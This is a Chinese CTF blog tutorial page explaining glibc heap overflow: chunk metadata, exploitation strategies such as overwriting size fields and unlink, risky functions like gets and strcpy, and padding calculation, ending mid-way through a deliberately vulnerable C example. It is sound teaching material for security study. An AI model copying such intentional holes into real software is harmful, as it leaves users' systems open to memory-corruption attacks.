<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><title>å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨ | å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™</title><meta name="author" content="uf4te"><meta name="copyright" content="uf4te"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="ä¸»è¦ä»‹ç»äº†å †çš„ä¸€äº›å¸¸è§æ¼æ´å’Œåˆ©ç”¨æ–¹æ³•"><meta property="og:type" content="article"><meta property="og:title" content="å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨"><meta property="og:url" content="https://www.uf4te.cn/posts/baa7ab63.html"><meta property="og:site_name" content="å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™"><meta property="og:description" content="ä¸»è¦ä»‹ç»äº†å †çš„ä¸€äº›å¸¸è§æ¼æ´å’Œåˆ©ç”¨æ–¹æ³•"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://www.uf4te.cn/img/cover/cover-126.jpg"><meta property="article:published_time" content="2024-05-27T08:13:25.000Z"><meta property="article:modified_time" content="2024-06-06T16:34:53.000Z"><meta property="article:author" content="uf4te"><meta property="article:tag" content="CTF"><meta property="article:tag" content="Pwn"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://www.uf4te.cn/img/cover/cover-126.jpg"><link rel="shortcut icon" href="/img/blog/avatar.jpg"><link rel="canonical" href="https://www.uf4te.cn/posts/baa7ab63.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//sdk.51.la"><meta name="baidu-site-verification" content="codeva-b3iLZWQECM"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload='this.media="all"'><script>!function(t){"use strict";!function(e){var r=window,s=document,n=t,c="".concat("https:"===s.location.protocol?"https://":"http://","sdk.51.la/js-sdk-pro.min.js"),i=s.createElement("script"),o=s.getElementsByTagName("script")[0];i.type="text/javascript",i.setAttribute("charset","UTF-8"),i.async=!0,i.src=c,i.id="LA_COLLECT",n.d=i;var a=function(){r.LA.ids.push(n)};r.LA?r.LA.ids&&a():(r.LA=t,r.LA.ids=[],a()),o.parentNode.insertBefore(i,o)}()}({id:"3GoBenqrrrBby5er",ck:"3GoBenqrrrBby5er",hashMode:!0})</script><script>!function(e,t,n,r){var i=t.createElement("script"),o=t.getElementsByTagName("script")[0];i.type="text/javascript",i.crossorigin=!0,i.onload=function(){(new e.LingQue.Monitor).init({id:"3GoBenqrrrBby5er"})},o.parentNode.insertBefore(i,o),i.src="https://sdk.51.la/perf/js-sdk-perf.min.js"}(window,document)</script><script>const GLOBAL_CONFIG={root:"/",algolia:{appId:"XY1UOYTY6S",apiKey:"4f03dfbbbff745c98fa4728e2ca61a96",indexName:"uf4te",hits:{per_page:10},languages:{input_placeholder:"æœç´¢æ–‡ç« ",hits_empty:"æ‰¾ä¸åˆ°æ‚¨æŸ¥è¯¢çš„å†…å®¹ï¼š${query}",hits_stats:"æ‰¾åˆ° ${hits} æ¡ç»“æœï¼Œç”¨æ—¶ ${time} æ¯«ç§’"}},localSearch:void 0,translate:{defaultEncoding:2,translateDelay:0,msgToTraditionalChinese:"ç¹",msgToSimplifiedChinese:"ç®€"},noticeOutdate:void 0,highlight:{plugin:"prismjs",highlightCopy:!0,highlightLang:!0,highlightHeightLimit:!1},copy:{success:"å¤åˆ¶æˆåŠŸ",error:"å¤åˆ¶é”™è¯¯",noSupport:"æµè§ˆå™¨ä¸æ”¯æŒ"},relativeDate:{homepage:!1,post:!1},runtime:"",date_suffix:{just:"åˆšåˆš",min:"åˆ†é’Ÿå‰",hour:"å°æ—¶å‰",day:"å¤©å‰",month:"ä¸ªæœˆå‰"},copyright:void 0,lightbox:"fancybox",Snackbar:{chs_to_cht:"ä½ å·²åˆ‡æ¢ä¸ºç¹ä½“",cht_to_chs:"ä½ å·²åˆ‡æ¢ä¸ºç®€ä½“",day_to_night:"ä½ å·²åˆ‡æ¢ä¸ºæ·±è‰²æ¨¡å¼",night_to_day:"ä½ å·²åˆ‡æ¢ä¸ºæµ…è‰²æ¨¡å¼",bgLight:"#323232",bgDark:"#696969",position:"bottom-center"},source:{justifiedGallery:{js:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js",css:"https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css"}},isPhotoFigcaption:!1,islazyload:!0,isAnchor:!1,percent:{toc:!1,rightside:!0}}</script><script id="config-diff">var GLOBAL_CONFIG_SITE={title:"å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨",isPost:!0,isHome:!1,isHighlightShrink:!1,isToc:!0,postUpdate:"2024-06-07 00:34:53"}</script><noscript><style>#nav{opacity:1}.justified-gallery img{opacity:1}#post-meta time,#recent-posts time{display:inline!important}</style></noscript><script>(e=>{e.saveToLocal={set:function(e,t,o){if(0===o)return;const n=864e5*o,a={value:t,expiry:(new Date).getTime()+n};localStorage.setItem(e,JSON.stringify(a))},get:function(e){const t=localStorage.getItem(e);if(!t)return;const o=JSON.parse(t);if(!((new Date).getTime()>o.expiry))return o.value;localStorage.removeItem(e)}},e.getScript=e=>new Promise(((t,o)=>{const n=document.createElement("script");n.src=e,n.async=!0,n.onerror=o,n.onload=n.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(n.onload=n.onreadystatechange=null,t())},document.head.appendChild(n)})),e.getCSS=(e,t=!1)=>new Promise(((o,n)=>{const a=document.createElement("link");a.rel="stylesheet",a.href=e,t&&(a.id=t),a.onerror=n,a.onload=a.onreadystatechange=function(){const e=this.readyState;e&&"loaded"!==e&&"complete"!==e||(a.onload=a.onreadystatechange=null,o())},document.head.appendChild(a)})),e.activateDarkMode=function(){document.documentElement.setAttribute("data-theme","dark"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#0d0d0d")},e.activateLightMode=function(){document.documentElement.setAttribute("data-theme","light"),null!==document.querySelector('meta[name="theme-color"]')&&document.querySelector('meta[name="theme-color"]').setAttribute("content","#ffffff")};const t=saveToLocal.get("theme");"dark"===t?activateDarkMode():"light"===t&&activateLightMode();const o=saveToLocal.get("aside-status");void 0!==o&&("hide"===o?document.documentElement.classList.add("hide-aside"):document.documentElement.classList.remove("hide-aside"));/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)&&document.documentElement.classList.add("apple")})(window)</script><link rel="stylesheet" href="/css/custom.css"></head><body><span id="fps"></span><script src="/js/reward.js"></script><script src="https://cdn1.tianli0.top/npm/sweetalert2@11.6.16/dist/sweetalert2.all.min.js"></script><script>var fdataUser={apiurl:"https://friends.uf4te.cn/",defaultFish:500,hungryFish:500}</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" media="print" onload='this.media="all"'><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-wowjs/lib/animate.min.css" media="print" onload='this.media="screen"'><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™" type="application/atom+xml"><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg" onerror='onerror=null,src="/img/404/loading_404.gif"' alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">æ–‡ç« </div><div class="length-num">134</div></a><a href="/tags/"><div class="headline">æ ‡ç­¾</div><div class="length-num">27</div></a><a href="/categories/"><div class="headline">åˆ†ç±»</div><div class="length-num">8</div></a></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>æ–‡åº“</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>æ–‡ç« å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ–‡ç« æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>æ–‡ç« åˆ†ç±»</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>éšä¾¿é€›é€›</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>ä¼‘é—²</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fa-solid fa-headphones"></i> <span>éŸ³ä¹</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa-brands fa-youtube"></i> <span>è§†é¢‘</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-regular fa-images"></i> <span>å›¾ç‰‡</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw fa-solid fa-gamepad"></i> <span>æ¸¸æˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>äº’åŠ¨</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>ç•™è¨€æ¿</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>æˆ‘çš„è¯´è¯´</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>å‹æƒ…é“¾æ¥</span></a></li><li><a class="site-page child" href="/friends/"><i class="fa-fw fa-solid fa-user-group"></i> <span>å‹é“¾æœ‹å‹åœˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>æ¨è</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>å®ç”¨å·¥å…·</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>æ—¶ç©ºä¹‹æµ·</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>æˆ‘çš„è£…å¤‡</span></a></li><li><a class="site-page child" href="/commentwall/"><i class="fa-fw fa-brands fa-skyatlas"></i> <span>è¨€è¯­æ˜Ÿç©º</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>å…³äºæœ¬ç«™</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image:url('/img/blog/default_top_img.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="å å…¥æ˜Ÿé‡çš„æœˆğŸŒ™"><img class="site-icon" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/blog/avatar.jpg"></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i> <span>æœç´¢</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i> <span>ä¸»é¡µ</span></a></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-sharp fa-solid fa-book-open"></i> <span>æ–‡åº“</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fa-solid fa-calendar-days"></i> <span>æ–‡ç« å½’æ¡£</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i> <span>æ–‡ç« æ ‡ç­¾</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i> <span>æ–‡ç« åˆ†ç±»</span></a></li><li><a class="site-page child" href="javascript:toRandomPost()"><i class="fa-fw fa-solid fa-car-side"></i> <span>éšä¾¿é€›é€›</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-gift"></i> <span>ä¼‘é—²</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fa-solid fa-headphones"></i> <span>éŸ³ä¹</span></a></li><li><a class="site-page child" href="/video/"><i class="fa-fw fa-brands fa-youtube"></i> <span>è§†é¢‘</span></a></li><li><a class="site-page child" href="/photo/"><i class="fa-fw fa-regular fa-images"></i> <span>å›¾ç‰‡</span></a></li><li><a class="site-page child" href="/play/"><i class="fa-fw fa-solid fa-gamepad"></i> <span>æ¸¸æˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-circle-nodes"></i> <span>äº’åŠ¨</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/comments/"><i class="fa-fw fa-sharp fa-solid fa-paper-plane"></i> <span>ç•™è¨€æ¿</span></a></li><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa-solid fa-pen-nib"></i> <span>æˆ‘çš„è¯´è¯´</span></a></li><li><a class="site-page child" href="/link/"><i class="fa-fw fas fa-link"></i> <span>å‹æƒ…é“¾æ¥</span></a></li><li><a class="site-page child" href="/friends/"><i class="fa-fw fa-solid fa-user-group"></i> <span>å‹é“¾æœ‹å‹åœˆ</span></a></li></ul></div><div class="menus_item"><a class="site-page group hide" href="javascript:void(0);"><i class="fa-fw fa-solid fa-thumbs-up"></i> <span>æ¨è</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/tools/"><i class="fa-fw fa-solid fa-wrench"></i> <span>å®ç”¨å·¥å…·</span></a></li><li><a class="site-page child" href="/collect/"><i class="fa-fw fa-solid fa-mug-saucer"></i> <span>æ—¶ç©ºä¹‹æµ·</span></a></li><li><a class="site-page child" href="/equipment/"><i class="fa-fw fa-solid fa-user-astronaut"></i> <span>æˆ‘çš„è£…å¤‡</span></a></li><li><a class="site-page child" href="/commentwall/"><i class="fa-fw fa-brands fa-skyatlas"></i> <span>è¨€è¯­æ˜Ÿç©º</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa-regular fa-address-card"></i> <span>å…³äºæœ¬ç«™</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-sharp fa-regular fa-pen-to-square fa-fw post-meta-icon"></i><span class="post-meta-label">å‘è¡¨äº</span><time class="post-meta-date-created" datetime="2024-05-27T08:13:25.000Z 2024-05-27 16:13:25">2024-05-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">æ›´æ–°äº</span><time class="post-meta-date-updated" datetime="2024-06-06T16:34:53.000Z 2024-06-07 00:34:53">2024-06-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-folder-open fa-fw post-meta-icon"></i> <a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">å­—æ•°æ€»è®¡:</span> <span class="word-count">10.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»æ—¶é•¿:</span> <span>42åˆ†é’Ÿ</span></span><span class="post-meta-separator">|</span><span data-flag-title="å †ç›¸å…³æ¼æ´ä¸åˆ©ç”¨"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">é˜…è¯»é‡:</span><span class="waline-pageview-count" data-path="/posts/baa7ab63.html"><i class="fa-solid fa-spinner fa-spin"></i></span></span> <span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">è¯„è®ºæ•°:</span><a href="/posts/baa7ab63.html#post-comment"><span class="waline-comment-count" data-path="/posts/baa7ab63.html"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div><section class="main-hero-waves-area waves-area"><svg class="waves-svg" xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s58 18 88 18 58-18 88-18 58 18 88 18v44h-352Z"></path></defs><g class="parallax"><use href="#gentle-wave" x="48" y="0"></use><use href="#gentle-wave" x="48" y="3"></use><use href="#gentle-wave" x="48" y="5"></use><use href="#gentle-wave" x="48" y="7"></use></g></svg></section></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h1><blockquote><p>å †æº¢å‡ºæ˜¯æŒ‡ç¨‹åºå‘æŸä¸ªå †å—ä¸­å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•° <mark>ï¼ˆæ³¨æ„ï¼šæ˜¯å†™å…¥çš„å­—èŠ‚æ•°è¶…è¿‡äº†å †å—æœ¬èº«å¯ä½¿ç”¨çš„å­—èŠ‚æ•°ï¼Œè€Œä¸æ˜¯ç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼Œå› ä¸ºå †ç®¡ç†å™¨ä¼šå¯¹ç”¨æˆ·æ‰€ç”³è¯·çš„å­—èŠ‚æ•°è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¹Ÿå¯¼è‡´å¯åˆ©ç”¨çš„å­—èŠ‚æ•°éƒ½ä¸å°äºç”¨æˆ·ç”³è¯·çš„å­—èŠ‚æ•°ï¼‰</mark>ï¼Œå¹¶è¦†ç›–åˆ°<strong>ç‰©ç†ç›¸é‚»çš„é«˜åœ°å€</strong>çš„ä¸‹ä¸€ä¸ªå †å—ï¼Œè½»åˆ™å¯ä»¥ä½¿å¾—ç¨‹åºå´©æºƒï¼Œé‡åˆ™å¯ä»¥ä½¿å¾—æ”»å‡»è€…æ§åˆ¶ç¨‹åºæ‰§è¡Œæµç¨‹</p><p>ä¸€èˆ¬æ¥è¯´ï¼Œå †æº¢å‡ºæ¼æ´éœ€è¦ä¸¤ä¸ªå‰æï¼š</p><ol><li><strong>ç¨‹åºå‘å †ä¸Šå†™å…¥æ•°æ®</strong></li><li><strong>å†™å…¥çš„æ•°æ®å¤§å°æ²¡æœ‰è¢«è‰¯å¥½åœ°æ§åˆ¶</strong></li></ol><p>å‚è€ƒæ–‡ç« ï¼š</p><ol><li><a target="_blank" rel="external nofollow noopener noreferrer" href="/go.html?target=aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi9oZWFwb3ZlcmZsb3ctYmFzaWMv">å †æº¢å‡º - CTF Wiki</a></li></ol></blockquote><p><em>ä¸æ ˆæº¢å‡ºä¸åŒçš„æ˜¯ï¼Œå †ä¸Šå¹¶ä¸å­˜åœ¨è¿”å›åœ°å€ç­‰å¯ä»¥è®©æ”»å‡»è€…ç›´æ¥æ§åˆ¶æ‰§è¡Œæµç¨‹çš„æ•°æ®ï¼Œå› æ­¤å †æº¢å‡ºé€šå¸¸æ— æ³•åƒæ ˆæº¢å‡ºä¸€æ ·ç›´æ¥æ§åˆ¶ EIP</em></p><p>ä¸€èˆ¬æ¥è¯´ï¼Œæˆ‘ä»¬åˆ©ç”¨å †æº¢å‡ºçš„ç­–ç•¥æ˜¯ï¼š</p><ol><li><p>è¦†ç›–ä¸å…¶<strong>ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª <code>chunk</code></strong>&nbsp;çš„å†…å®¹</p><ul><li><code>prev_size</code></li><li><code>size</code>ï¼Œä¸»è¦æœ‰ä¸‰ä¸ªæ¯”ç‰¹ä½ï¼Œä»¥åŠè¯¥å †å—çœŸæ­£çš„å¤§å°<ul><li><code>NON_MAIN_ARENA</code></li><li><code>IS_MAPPED</code></li><li><code>PREV_INUSE</code></li><li><code>the True chunk size</code></li></ul></li><li><code>chunk content</code>ï¼Œä»è€Œæ”¹å˜ç¨‹åºå›ºæœ‰çš„æ‰§è¡Œæµ</li></ul></li><li><p>åˆ©ç”¨å †ä¸­çš„æœºåˆ¶ï¼ˆå¦‚ <code>unlink</code> ç­‰ ï¼‰æ¥å®ç°ä»»æ„åœ°å€å†™å…¥æˆ–æ§åˆ¶å †å—ä¸­çš„å†…å®¹ç­‰æ•ˆæœï¼Œä»è€Œæ¥æ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµ</p></li></ol><blockquote><p>å †æº¢å‡ºé€šå¸¸éœ€è¦é…åˆå…¶ä»–çš„æ–¹æ³•æ¥å®ç°æ¼æ´çš„åˆ©ç”¨ï¼Œæ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•æœ‰ï¼šChunk Extend and Overlap ç­‰</p></blockquote><hr><h2 id="å…³é”®æ­¥éª¤"><a href="#å…³é”®æ­¥éª¤" class="headerlink" title="å…³é”®æ­¥éª¤"></a>å…³é”®æ­¥éª¤</h2><h3 id="å¯»æ‰¾å †åˆ†é…å‡½æ•°"><a href="#å¯»æ‰¾å †åˆ†é…å‡½æ•°" class="headerlink" title="å¯»æ‰¾å †åˆ†é…å‡½æ•°"></a>å¯»æ‰¾å †åˆ†é…å‡½æ•°</h3><blockquote><p>é€šå¸¸æ¥è¯´å †æ˜¯é€šè¿‡è°ƒç”¨ Glibc å‡½æ•° <code>malloc</code> è¿›è¡Œåˆ†é…çš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ä¼šä½¿ç”¨ <code>calloc</code> åˆ†é…ï¼Œ<code>realloc</code> åŒæ ·ä¹Ÿå¯ä»¥è¾¾åˆ°ç±»ä¼¼çš„æ•ˆæœ</p><p>å› æ­¤ï¼Œå¸¸ç”¨çš„å †åˆ†é…å‡½æ•°æœ‰ï¼š</p><ol><li><code>malloc</code></li><li><code>calloc</code></li><li><code>realloc</code></li></ol></blockquote><p><code>calloc</code> ä¸ <code>malloc</code> çš„åŒºåˆ«æ˜¯&nbsp;<strong>calloc åœ¨åˆ†é…åä¼šè‡ªåŠ¨è¿›è¡Œæ¸…ç©ºï¼Œè¿™å¯¹äºæŸäº›ä¿¡æ¯æ³„éœ²æ¼æ´çš„åˆ©ç”¨æ¥è¯´æ˜¯è‡´å‘½çš„</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token function">calloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// ç­‰ä»·äº</span>
ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">memset</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="å¯»æ‰¾å±é™©å‡½æ•°"><a href="#å¯»æ‰¾å±é™©å‡½æ•°" class="headerlink" title="å¯»æ‰¾å±é™©å‡½æ•°"></a>å¯»æ‰¾å±é™©å‡½æ•°</h3><blockquote><p>é€šè¿‡å¯»æ‰¾å±é™©å‡½æ•°ï¼Œå¯ä»¥å¿«é€Ÿç¡®å®šç¨‹åºæ˜¯å¦å¯èƒ½å­˜åœ¨å †æº¢å‡ºæ¼æ´</p></blockquote><p>å¸¸è§çš„å±é™©å‡½æ•°å¦‚ä¸‹</p><ul><li><p>è¾“å…¥</p><ul><li>getsï¼Œç›´æ¥è¯»å–ä¸€è¡Œï¼Œå¿½ç•¥&nbsp;<code>'\x00'</code></li><li>scanf</li><li>vscanf</li></ul></li><li><p>è¾“å‡º</p><ul><li>sprintf</li></ul></li><li><p>å­—ç¬¦ä¸²</p><ul><li>strcpyï¼Œå­—ç¬¦ä¸²å¤åˆ¶ï¼Œé‡åˆ°&nbsp;<code>'\x00'</code>&nbsp;åœæ­¢</li><li>strcatï¼Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé‡åˆ°&nbsp;<code>'\x00'</code>&nbsp;åœæ­¢</li><li>bcopy</li></ul></li></ul><hr><h3 id="ç¡®å®šå¡«å……é•¿åº¦"><a href="#ç¡®å®šå¡«å……é•¿åº¦" class="headerlink" title="ç¡®å®šå¡«å……é•¿åº¦"></a>ç¡®å®šå¡«å……é•¿åº¦</h3><blockquote><p>è¿™ä¸€éƒ¨åˆ†ä¸»è¦æ˜¯è®¡ç®—æˆ‘ä»¬å¼€å§‹å†™å…¥çš„åœ°å€ä¸æˆ‘ä»¬æ‰€è¦è¦†ç›–çš„åœ°å€ä¹‹é—´çš„è·ç¦»</p></blockquote><p>ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦é‡ç‚¹æ³¨æ„ï¼š</p><ul><li><em><code>malloc</code> çš„å‚æ•°å¹¶ä¸ç­‰äºå®é™…åˆ†é…å †å—çš„å¤§å°</em></li></ul><p><strong><code>ptmalloc2</code> åˆ†é…å‡ºæ¥çš„å¤§å°æ˜¯å¯¹é½çš„ï¼Œè¿™ä¸ªé•¿åº¦ä¸€èˆ¬æ˜¯å­—é•¿çš„ 2 å€</strong>ã€‚æ¯”å¦‚ 32 ä½ç³»ç»Ÿæ˜¯ 8 å­—èŠ‚ï¼Œ64 ä½ç³»ç»Ÿæ˜¯ 16 å­—èŠ‚</p><p>å› æ­¤ï¼Œ<strong>å¯¹äºä¸å¤§äº 2 å€å­—é•¿çš„è¯·æ±‚ï¼Œ<code>malloc</code> ä¼šç›´æ¥è¿”å› 2 å€å­—é•¿çš„å—ï¼ˆä¹Ÿå°±æ˜¯æœ€å° <code>chunk</code>ï¼‰</strong>ï¼Œæ¯”å¦‚ 64 ä½ç³»ç»Ÿæ‰§è¡Œ <code>malloc(0)</code> ä¼šè¿”å›ç”¨æˆ·åŒºåŸŸä¸º 16 å­—èŠ‚çš„å—</p><ul><li><em>ç”¨æˆ·åŒºåŸŸçš„å¤§å°ä¸ç­‰äº <code>chunk_head.size</code></em></li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">chunk_head.size = ç”¨æˆ·åŒºåŸŸå¤§å° + 2 * å­—é•¿<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç”¨æˆ·ç”³è¯·çš„å†…å­˜å¤§å°ä¼šè¢«ä¿®æ”¹ï¼Œæœ‰å¯èƒ½ä¼šä½¿ç”¨ä¸å…¶ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª <code>chunk</code> çš„ <code>prev_size</code> å­—æ®µæ¥å‚¨å­˜å†…å®¹</li></ul><p>ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>chunk<span class="token punctuation">;</span>
  chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Get input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
